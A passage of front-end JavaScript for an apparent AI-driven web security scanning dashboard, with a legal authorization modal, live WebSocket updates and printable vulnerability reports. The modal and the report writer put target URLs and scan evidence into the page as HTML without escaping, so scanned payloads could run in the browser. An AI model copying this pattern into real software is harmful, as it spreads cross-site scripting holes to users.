        { text: '[Agent] injection-vuln completed (3m 18s, $4.10)', delay: 800, cls: 'terminal-success' },
        { text: '[Agent] xss-vuln completed (3m 05s, $3.90)', delay: 600, cls: 'terminal-success' },
        { text: '[Agent] auth-vuln completed (3m 40s, $4.50)', delay: 700, cls: 'terminal-success' },
        { text: '[Shield] Pipeline running... check dashboard for live results', delay: 500, cls: 'terminal-success' },
      ];
      let totalDelay = 0;
      lines.forEach(line => {
        totalDelay += line.delay;
        setTimeout(() => {
          const div = document.createElement('div');
          div.className = `terminal-line ${line.cls || ''}`;
          div.textContent = line.text;
          terminal.appendChild(div);
          terminal.scrollTop = terminal.scrollHeight;
        }, totalDelay);
      });
      setTimeout(() => {
        const nextBtn = document.querySelector('.tutorial-step[data-step="4"] .tutorial-next-btn');
        if (nextBtn) nextBtn.disabled = false;
        runBtn.innerHTML = '<i class="fas fa-check"></i> Completed';
      }, totalDelay + 400);
    });
  }

  // Step 5: Render agents grid
  const agentsGrid = document.getElementById('tut-agents-grid');
  if (agentsGrid) {
    agentsGrid.innerHTML = AGENTS.map(a =>
      `<div class="tutorial-agent-card" id="tut-agent-${a.id}"><div class="tutorial-agent-icon"><i class="fas ${a.icon}"></i></div><div><div class="tutorial-agent-name">${a.name}</div><div class="tutorial-agent-status">${a.phase}</div></div></div>`
    ).join('');
    // Animate agents one by one
    let i = 0;
    const interval = setInterval(() => {
      if (i >= AGENTS.length) { clearInterval(interval); return; }
      const card = document.getElementById(`tut-agent-${AGENTS[i].id}`);
      if (card) {
        card.classList.add('running');
        setTimeout(() => { card.classList.remove('running'); card.classList.add('done'); }, 800);
      }
      i++;
    }, 500);
  }

  // Init
  activateStep(1);
}

/* ========================================
   TOAST
   ======================================== */
function showToast(message) {
  const existing = document.querySelector('.toast');
  if (existing) existing.remove();
  const toast = document.createElement('div');
  toast.className = 'toast';
  toast.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
  toast.style.cssText = 'position:fixed;bottom:24px;right:24px;z-index:9999;background:#172560;border:1px solid rgba(255,239,77,0.2);color:#e8ecf5;padding:14px 20px;border-radius:10px;font-size:13px;font-family:Inter,sans-serif;display:flex;align-items:center;gap:10px;box-shadow:0 8px 32px rgba(0,0,0,0.4);animation:toastIn 0.3s ease';
  document.body.appendChild(toast);
  if (!document.getElementById('toast-style')) {
    const s = document.createElement('style'); s.id = 'toast-style';
    s.textContent = '@keyframes toastIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}';
    document.head.appendChild(s);
  }
  setTimeout(() => { toast.style.opacity = '0'; toast.style.transition = 'opacity 0.3s'; setTimeout(() => toast.remove(), 300); }, 4000);
}

/* ========================================
   AUTHORIZATION MODAL
   ======================================== */
function showAuthorizationModal(targetUrl, onConfirm) {
  const overlay = document.createElement('div');
  overlay.className = 'modal-overlay';
  overlay.innerHTML = `
    <div class="modal">
      <div class="modal-icon"><i class="fas fa-shield-halved"></i></div>
      <h2>Authorization Required</h2>
      <p class="modal-subtitle">You must confirm authorization before scanning <strong>${targetUrl}</strong></p>
      <div class="legal-box">
        <h4>Terms of Authorized Security Testing</h4>
        <ul>
          <li>I am the <strong>owner</strong> of the target application or have <strong>written authorization</strong> from the owner to perform security testing.</li>
          <li>I understand that this tool will actively probe for vulnerabilities, including sending specially crafted requests to detect SQL injection, XSS, auth bypass, SSRF, and other security weaknesses.</li>
          <li>I confirm the target is a <strong>staging/test environment</strong> or I accept full responsibility for testing production systems.</li>
          <li>I understand this tool does <strong>not modify data destructively</strong> but may create test entries during the scanning process.</li>
        </ul>
        <p class="warning-text">Unauthorized computer access is a criminal offense under Art. 154-A of the Brazilian Penal Code, the US Computer Fraud and Abuse Act (CFAA), and similar laws worldwide.</p>
      </div>
      <div class="consent-row" id="consent-1"><input type="checkbox" id="chk-owner"><label for="chk-owner">I own this application or have explicit written authorization to test it</label></div>
      <div class="consent-row" id="consent-2"><input type="checkbox" id="chk-staging"><label for="chk-staging">I am testing against a staging/test environment (or accept full responsibility)</label></div>
      <div class="consent-row" id="consent-3"><input type="checkbox" id="chk-legal"><label for="chk-legal">I understand the legal implications and take full responsibility</label></div>
      <div class="modal-actions">
        <button class="btn-ghost" id="modal-cancel"><i class="fas fa-times"></i> Cancel</button>
        <button class="btn-primary" id="modal-confirm" disabled><i class="fas fa-check"></i> Confirm & Launch</button>
      </div>
    </div>`;

  document.body.appendChild(overlay);
  const chks = ['#chk-owner','#chk-staging','#chk-legal'].map(s => overlay.querySelector(s));
  const confirmBtn = overlay.querySelector('#modal-confirm');
  const update = () => { confirmBtn.disabled = !chks.every(c => c.checked); };
  chks.forEach(c => c.addEventListener('change', update));
  overlay.querySelectorAll('.consent-row').forEach(row => {
    row.addEventListener('click', (e) => { if (e.target.tagName !== 'INPUT') { const c = row.querySelector('input'); c.checked = !c.checked; update(); } });
  });
  const close = () => overlay.remove();
  overlay.querySelector('#modal-cancel').addEventListener('click', close);
  overlay.addEventListener('click', (e) => { if (e.target === overlay) close(); });
  confirmBtn.addEventListener('click', () => { close(); onConfirm(); });
}

/* ========================================
   MOBILE MENU
   ======================================== */
function initMobileMenu() {
  const btn = document.getElementById('mobile-menu-btn');
  const sidebar = document.querySelector('.sidebar');
  const overlay = document.getElementById('sidebar-overlay');
  if (!btn || !sidebar || !overlay) return;
  btn.addEventListener('click', () => sidebar.classList.toggle('open'));
  overlay.addEventListener('click', () => sidebar.classList.remove('open'));
  document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', () => { if (window.innerWidth <= 640) sidebar.classList.remove('open'); });
  });
}

/* ========================================
   WEBSOCKET CLIENT - Live Updates
   ======================================== */
const ShieldWS = {
  ws: null,
  listeners: new Set(),

  connect() {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const url = `${proto}//${location.host}/ws`;

    try {
      this.ws = new WebSocket(url);
    } catch {
      console.log('[Shield WS] WebSocket not available (static mode)');
      return;
    }

    this.ws.onopen = () => {
      console.log('[Shield WS] Connected');
      showToast('Live updates connected');
    };

    this.ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        this.listeners.forEach(fn => fn(data));

        // Handle scan events
        if (data.type === 'scan-event') {
          this.handleScanEvent(data);
        }
      } catch { /* ignore parse errors */ }
    };

    this.ws.onclose = () => {
      console.log('[Shield WS] Disconnected, reconnecting in 5s...');
      setTimeout(() => this.connect(), 5000);
    };

    this.ws.onerror = () => {
      // Silent fail for static file serving (no server)
    };
  },

  handleScanEvent(data) {
    if (data.agent && data.status) {
      showToast(`Agent ${data.agent}: ${data.status}`);
    }

    // Update dashboard if on that page
    if (getPageFromHash() === 'dashboard') {
      initDashboard();
    }
  },

  onMessage(fn) {
    this.listeners.add(fn);
    return () => this.listeners.delete(fn);
  },

  send(data) {
    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify(data));
    }
  }
};

/* ========================================
   PDF EXPORT (Client-side)
   Uses browser print for PDF generation
   ======================================== */
function exportReportPDF(scanId) {
  // For server mode: redirect to HTML report endpoint
  if (location.port && location.port !== '0') {
    window.open(`/api/reports/${scanId}/pdf`, '_blank');
    return;
  }

  // Client-side fallback: generate printable report from Store data
  const scan = Store.scans.find(s => s.id === scanId);
  const scanVulns = Store.vulns.filter(v => v.scan === scanId);

  const printWindow = window.open('', '_blank');
  printWindow.document.write(`<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><title>Shield Report - ${scanId}</title>
<style>
  body { font-family: 'Segoe UI', system-ui, sans-serif; max-width: 800px; margin: 0 auto; padding: 40px; color: #1a1a2e; line-height: 1.6; }
  .header { background: #2A428C; color: white; padding: 30px; border-radius: 10px; margin-bottom: 30px; }
  .header h1 { margin: 0 0 5px; font-size: 24px; }
  .header .subtitle { opacity: 0.8; font-size: 14px; }
  .header .meta { margin-top: 15px; display: flex; gap: 20px; font-size: 12px; opacity: 0.9; }
  h2 { color: #2A428C; border-bottom: 2px solid #FFEF4D; padding-bottom: 8px; margin-top: 30px; }
  table { width: 100%; border-collapse: collapse; margin: 16px 0; }
  th, td { border: 1px solid #e2e8f0; padding: 10px 14px; text-align: left; font-size: 13px; }
  th { background: #f8fafc; color: #475569; font-weight: 600; }
  .severity { display: inline-block; padding: 2px 10px; border-radius: 4px; font-size: 11px; font-weight: 700; text-transform: uppercase; }
  .severity.critical { background: #fde8e8; color: #dc2626; }
  .severity.high { background: #fff3e0; color: #ea580c; }
  .severity.medium { background: #fffde7; color: #ca8a04; }
  .severity.low { background: #e8f4fd; color: #2563eb; }
  .vuln-card { border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px; margin: 12px 0; page-break-inside: avoid; }
  .vuln-card h3 { margin: 0 0 8px; font-size: 14px; }
  .vuln-card p { margin: 4px 0; font-size: 13px; color: #475569; }
  .vuln-card .label { font-weight: 600; color: #2A428C; }
  code { background: #f1f5f9; padding: 2px 6px; border-radius: 3px; font-size: 12px; }
  .footer { margin-top: 40px; padding-top: 20px; border-top: 1px solid #e2e8f0; font-size: 11px; color: #94a3b8; text-align: center; }
  .print-btn { background: #2A428C; color: white; border: none; padding: 10px 24px; border-radius: 6px; cursor: pointer; font-size: 14px; margin-bottom: 20px; }
  @media print { .print-btn { display: none; } body { padding: 20px; } }
</style></head><body>
<button class="print-btn" onclick="window.print()">⬇ Imprimir / Salvar como PDF</button>
<div class="header">
  <h1>🛡️ ConstruData Shield</h1>
  <div class="subtitle">Security Assessment Report</div>
  <div class="meta">
    <span>Scan: ${scanId}</span>
    <span>Target: ${scan?.target || 'N/A'}</span>
    <span>Date: ${new Date().toISOString().split('T')[0]}</span>
  </div>
</div>

<h2>Summary</h2>
<table>
  <tr><th>Target</th><td>${scan?.target || 'N/A'}</td></tr>
  <tr><th>Type</th><td>${scan?.type || 'Full Scan'}</td></tr>
  <tr><th>Status</th><td>${scan?.status || 'Complete'}</td></tr>
  <tr><th>Duration</th><td>${scan?.duration || 'N/A'}</td></tr>
  <tr><th>Vulnerabilities Found</th><td>${scanVulns.length}</td></tr>
</table>

<h2>Vulnerabilities (${scanVulns.length})</h2>
${scanVulns.map(v => `
<div class="vuln-card">
  <h3><span class="severity ${v.severity}">${v.severity}</span> ${v.title}</h3>
  ${v.cvss ? `<p><span class="label">CVSS:</span> ${v.cvss}</p>` : ''}
  ${v.cwe ? `<p><span class="label">CWE:</span> ${v.cwe}</p>` : ''}
  ${v.endpoint ? `<p><span class="label">Endpoint:</span> <code>${v.endpoint}</code></p>` : ''}
  ${v.explanation ? `<p><span class="label">Descrição:</span> ${v.explanation}</p>` : ''}
  ${v.impact ? `<p><span class="label">Impacto:</span> ${v.impact}</p>` : ''}
  ${v.remediation ? `<p><span class="label">Remediação:</span> ${v.remediation}</p>` : ''}
  ${v.evidence ? `<p><span class="label">Evidência:</span> <code>${v.evidence}</code></p>` : ''}
</div>`).join('')}

<div class="footer">
  ConstruData Shield &copy; ${new Date().getFullYear()} — AI-Powered Security Testing Platform<br>
  This report is confidential and intended for authorized personnel only.
</div>
</body></html>`);
  printWindow.document.close();
}

// Attach PDF export to report download buttons
function attachReportExports() {
  document.querySelectorAll('.report-card .btn-outline').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      const card = btn.closest('.report-card');
      const scanText = card?.querySelector('.report-date')?.textContent || '';
      const scanMatch = scanText.match(/Scan #([\w-]+)/);
      const scanId = scanMatch ? scanMatch[1] : Store.scans[0]?.id || 'SC-7f3a1b2c';
      exportReportPDF(scanId);
    });
  });
}

/* ── Init ── */
window.addEventListener('hashchange', () => navigate(getPageFromHash()));
document.addEventListener('DOMContentLoaded', () => {
  navigate(getPageFromHash());
  initMobileMenu();
  ShieldWS.connect();

  // Register service worker for PWA
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('./sw.js').catch(() => {
      // Silent fail - PWA is progressive enhancement
    });
  }
});
